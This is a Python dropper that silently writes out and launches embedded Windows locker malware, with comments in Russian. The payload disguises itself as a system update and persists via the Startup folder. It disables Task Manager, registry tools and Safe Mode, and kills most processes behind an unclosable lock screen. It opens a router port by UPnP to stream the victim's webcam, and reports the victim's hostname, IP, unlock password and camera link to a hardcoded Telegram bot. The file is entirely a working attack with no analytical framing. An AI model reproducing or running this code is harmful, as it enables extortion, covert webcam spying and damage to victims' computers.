import base64
import os
import sys
import tempfile
import subprocess

PAYLOAD_CODE = r'''
import os, sys, time, shutil, requests, tkinter as tk, psutil, winreg, threading, random, string, socket
import cv2
import tempfile
from flask import Flask, Response

# Пробуем импортировать UPnP для обхода роутера
try:
    import miniupnpc
except:
    miniupnpc = None

if os.name != 'nt': sys.exit(1)
BOT_TOKEN = "8320512407:AAF8XKfXkVYUTP7x_FHHMo1oAK_CkFr95VM"
CHAT_ID = "8573437923"
PASSWORD = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

app = Flask(__name__)

# --- ФУНКЦИЯ ОБХОДА РОУТЕРА ---
def open_port_upnp():
    if not miniupnpc: return False
    try:
        upnp = miniupnpc.UPnP()
        upnp.discoverdelay = 200
        upnp.discover()
        upnp.selectigd()
        # Открываем порт 5000
        upnp.addportmapping(5000, 'TCP', upnp.lanaddr, 5000, 'CamServer', '')
        return True
    except:
        return False

# --- КАМЕРА ---
def generate_frames():
    cap = cv2.VideoCapture(0)
    while True:
        success, frame = cap.read()
        if not success:
            break
        else:
            ret, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

@app.route('/cam')
def video_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

def start_camera_server():
    app.run(host='0.0.0.0', port=5000, threaded=True)

# --- СВЯЗЬ С БОТОМ ---
def send_telegram_msg(text):
    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
    except: pass

def check_bot_for_unlock():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    while True:
        try:
            res = requests.get(f"{url}?timeout=10").json()
            if res.get("result"):
                for update in res["result"]:
                    if "callback_query" in update:
                        if update["callback_query"]["data"] == "confirm":
                            return True
        except: pass
        time.sleep(2)

# --- БЛОКИРОВКА ---
def disable_system_tools():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SafeBoot", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteKey(key, "Minimal")
        winreg.DeleteKey(key, "Network")
        winreg.CloseKey(key)
    except: pass
    os.system('shutdown -a')

def kill_unwanted():
    allowed = ["explorer.exe", "python.exe", "system_update.exe", "conhost.exe", "dwm.exe", "chrome.exe", "firefox.exe", "telegram.exe", "discord.exe"]
    while True:
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() not in allowed: proc.kill()
            except: pass
        time.sleep(1)

def show_window():
    root = tk.Tk()
    root.title("SYSTEM LOCKED")
    root.configure(bg="black")
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    root.geometry(f"{screen_width//2}x{screen_height}+{screen_width//2}+0")
    root.attributes("-topmost", True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    label = tk.Label(root, text="🚨 СИСТЕМА ЗАБЛОКИРОВАНА 🚨\n\nСвяжитесь с администратором.", fg="#ff0000", bg="black", font=("Consolas", 14, "bold"))
    label.pack(expand=True)
    
    entry = tk.Entry(root, show="*", font=("Arial", 14), width=20)
    entry.pack(pady=20)
    
    def check_pass():
        if entry.get() == PASSWORD:
            label.config(text="✅ Разблокировано.", fg="green")
            time.sleep(2)
            os.system("shutdown -r -t 3")
            sys.exit(0)

    btn = tk.Button(root, text="Разблокировать", command=check_pass, bg="red", fg="white")
    btn.pack(pady=10)

    def wait_for_unlock():
        if check_bot_for_unlock():
            label.config(text="✅ Разблокировано админом.", fg="green")
            time.sleep(2)
            os.system("shutdown -r -t 3")
            sys.exit(0)

    threading.Thread(target=wait_for_unlock, daemon=True).start()
    threading.Thread(target=kill_unwanted, daemon=True).start()
    threading.Thread(target=start_camera_server, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\svchost_update.exe')
    try: shutil.copy(sys.executable, startup_path)
    except: pass
    
    hostname = socket.gethostname()
    try:
        external_ip = requests.get('https://api.ipify.org').text
    except:
        external_ip = "Неизвестен"
        
    # Пытаемся открыть порт на роутере
    port_opened = open_port_upnp()
    status_msg = "✅ Порт открыт (UPnP)" if port_opened else "⚠️ Порт закрыт (Нужен проброс)"
        
    msg = f"🚨 **Жертва запустила локер!**\n💻 ПК: `{hostname}`\n🔑 **ПАРОЛЬ:** `{PASSWORD}`\n🌐 **IP:** `{external_ip}`\n🎥 **КАМЕРА:** http://{external_ip}:5000/cam\n\n{status_msg}"
    send_telegram_msg(msg)
    
    disable_system_tools()
    show_window()
'''

def main():
    try:
        temp_dir = tempfile.gettempdir()
        script_path = os.path.join(temp_dir, "system_update.py")
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(PAYLOAD_CODE)
        subprocess.Popen(["pythonw", script_path], creationflags=0x08000000)
    except Exception:
        pass

if __name__ == "__main__":
    main()
